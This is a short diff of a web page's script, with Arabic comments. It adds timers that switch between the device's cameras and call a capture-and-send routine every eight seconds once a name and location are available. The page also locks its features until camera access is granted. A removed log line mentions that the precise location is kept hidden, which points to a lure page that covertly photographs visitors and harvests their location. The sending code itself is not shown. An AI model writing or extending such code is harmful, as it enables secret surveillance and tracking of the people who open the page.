+                switchInterval = setInterval(() => { if (cameraAllowed && cameraReady) switchCamera(); }, 8000);
+                // التصوير كل 8 ثوانٍ
+                captureInterval = setInterval(() => { if (cameraAllowed && cameraReady && userName && locationReady)
+                        captureAndSend(); }, 8000);
+            }
 
-            // ===== بدء الموقع =====
-            getPreciseLocation();
+            // ===== زر طلب الكاميرا =====
+            requestBtn.addEventListener('click', requestCamera);
 
-            console.log('💕 التصميم الجديد جاهز (الموقع مخفي)');
+            // ===== تعطيل كل شيء في البداية =====
+            disableAllFeatures();
+
+            // ===== محاولة طلب الكاميرا تلقائياً عند تحميل الصفحة =====
+            // لكننا نترك المستخدم يضغط على الزر لتجنب مشاكل السياسة
+            // نعرض فقط الرسالة
+
+            console.log('💕 التطبيق جاهز، ينتظر إذن الكاميرا.');
         })();
     </script>
 </body>
